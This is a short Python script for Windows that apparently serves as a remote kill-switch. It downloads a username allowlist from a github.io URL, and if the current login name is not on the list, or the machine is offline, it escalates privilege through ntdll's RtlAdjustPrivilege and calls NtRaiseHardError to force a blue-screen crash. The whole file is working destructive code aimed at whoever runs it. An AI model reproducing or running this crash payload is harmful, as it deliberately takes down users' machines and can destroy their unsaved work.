import ctypes, os, requests
import http.client as httplib
def BSOD(stop_code):
    enabled = ctypes.c_bool()
    res = ntdll.RtlAdjustPrivilege(SeShutdownPrivilege, True, False, ctypes.pointer(enabled))
    if not res:
        print("PA True")
    else:
        print("PA False")
        raise ctypes.WinError(ntdll.RtlAdjustPrivilege(res))
    response = ctypes.c_ulong()
    res = ntdll.NtRaiseHardError(stop_code, 0, 0, 0, 6, ctypes.byref(response))
    if not res:
        print("BSOD True")
    else:
        print("BSOD False")
        raise ctypes.WinError(ntdll.RtlAdjustPrivilege(res))
def internet_on():
    connection = httplib.HTTPConnection("www.google.com", timeout=3)
    try:
        connection.request("HEAD", "/")
        connection.close()
        return True
    except Exception:
        return False
ntdll = ctypes.windll.ntdll
SeShutdownPrivilege = 19
found = False
VERSION = "V-03" # Version is super important EX: V-01, V-02, ect...
UPDATE = "0.2"
if internet_on():
    json = requests.get("https://whaleyogurt.github.io/API/OA_API_KEYS.json").json()
    UNI = json["usernames"]["UNI"]
    DamageControl = json["usernames"][VERSION]
    # Checks if user is exempt from script
    for username in UNI:
        if os.getlogin() == username:
            found = True
            break
        else:
            continue
    if found == False:
        for username in DamageControl:
            if os.getlogin() == username:
                found = True
                break
            else:
                continue
        if found == False:
            BSOD(0xDEADDEAD)
else:
    BSOD(0xDEADDEAD)
